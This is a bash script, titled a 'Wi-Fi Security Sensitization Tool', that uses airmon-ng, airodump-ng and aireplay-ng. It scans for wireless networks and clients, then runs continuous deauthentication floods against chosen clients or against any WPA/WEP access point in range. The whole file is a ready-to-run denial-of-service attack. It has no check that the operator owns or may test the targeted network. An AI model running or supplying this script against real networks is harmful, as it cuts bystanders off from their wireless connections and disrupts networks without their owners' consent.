#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
CYAN="\e[36m"
RESET="\e[0m"

echo -e "${CYAN}[*] Wi-Fi Security Sensitization Tool v2 - Multi-Mode${RESET}"

read -p "Enter your wireless interface (e.g., wlan0): " iface

read -p "Are you already connected to a Wi-Fi network? (y/n): " connected

if [[ "$connected" =~ ^[Yy]$ ]]; then
    echo -e "${GREEN}[*] Checking current connection...${RESET}"

    connected_bssid=$(iw dev "$iface" link | awk '/Connected to/ {print $3}')
    if [[ -z "$connected_bssid" ]]; then
        echo -e "${RED}[!] Not connected to any network. Cannot continue in internal mode.${RESET}"
        connected="n"
    else
        echo -e "${GREEN}[✓] Connected to: $connected_bssid${RESET}"

        sudo airmon-ng start "$iface"
        mon_iface="${iface}mon"

        echo -e "${GREEN}[*] Scanning for clients on $connected_bssid (20 seconds)...${RESET}"
        timeout 20s sudo airodump-ng --bssid "$connected_bssid" --write internal_scan --output-format csv "$mon_iface" >/dev/null 2>&1

        echo -e "${CYAN}Detected Clients:${RESET}"
        awk -F',' '/Station MAC/ {next} /^[[:space:]]*$/ {next} /^[[:xdigit:]:]{17}/ {printf "%d) %s\n", ++i, $1; clients[i]=$1 } END { print i > "/tmp/client_total" }' internal_scan-01.csv

        client_total=$(cat /tmp/client_total)
        if [[ "$client_total" -lt 1 ]]; then
            echo -e "${RED}[!] No clients found.${RESET}"
            sudo airmon-ng stop "$mon_iface"
            exit 1
        fi

        echo -e "${CYAN}\nEnter multiple client numbers to deauth, separated by commas (e.g., 1,3,5) or 'all' to target all:${RESET}"
        read -p "Your choice: " client_selection

        selected_clients=()

        if [[ "$client_selection" == "all" ]]; then
            for i in $(seq 1 "$client_total"); do
                client_mac=$(awk -F',' -v c="$i" 'BEGIN{n=0} /^[[:xdigit:]:]{17}/ {n++; if(n==c) print $1}' internal_scan-01.csv | xargs)
                selected_clients+=("$client_mac")
            done
        else
            IFS=',' read -ra indexes <<< "$client_selection"
            for idx in "${indexes[@]}"; do
                client_mac=$(awk -F',' -v c="$idx" 'BEGIN{n=0} /^[[:xdigit:]:]{17}/ {n++; if(n==c) print $1}' internal_scan-01.csv | xargs)
                [[ -n "$client_mac" ]] && selected_clients+=("$client_mac")
            done
        fi

        read -p "Enter deauthentication duration in seconds: " duration

        echo -e "${RED}[*] Launching deauth attacks for $duration seconds...${RESET}"
        for client_mac in "${selected_clients[@]}"; do
            echo -e "${CYAN}[+] Deauthing client $client_mac${RESET}"
            timeout "$duration"s sudo aireplay-ng --deauth 0 -a "$connected_bssid" -c "$client_mac" "$mon_iface"
        done

        echo -e "${GREEN}[✓] Done. Stopping monitor mode...${RESET}"
        sudo airmon-ng stop "$mon_iface"
        exit 0
    fi
fi

echo -e "${CYAN}[*] External Wi-Fi Scan Mode${RESET}"

sudo airmon-ng start "$iface"
mon_iface="${iface}mon"

echo -e "${GREEN}[*] Scanning for external APs (15s)...${RESET}"
timeout 15s sudo airodump-ng "$mon_iface" --write scan_output --output-format csv >/dev/null 2>&1

echo -e "\n${CYAN}Available BSSIDs:${RESET}"
awk -F',' '/WPA|WEP/ { printf "%d) %s (%s)\n", ++i, $1, $14; bssids[i]=$1 } END { print i > "/tmp/total_bssids" }' scan_output-01.csv

total=$(cat /tmp/total_bssids)
read -p "Select BSSID number (1-$total): " choice

target_bssid=$(awk -F',' -v c="$choice" 'BEGIN{i=0} /WPA|WEP/ { i++; if(i==c) print $1 }' scan_output-01.csv | xargs)
target_channel=$(awk -F',' -v c="$choice" 'BEGIN{i=0} /WPA|WEP/ { i++; if(i==c) print $4 }' scan_output-01.csv | xargs)

read -p "Enter deauthentication duration in seconds: " duration

echo -e "${RED}[*] Launching deauth on $target_bssid for $duration seconds...${RESET}"
timeout "${duration}s" sudo aireplay-ng --deauth 0 -a "$target_bssid" "$mon_iface"

echo -e "${GREEN}[✓] Done. Stopping monitor mode...${RESET}"
sudo airmon-ng stop "$mon_iface"
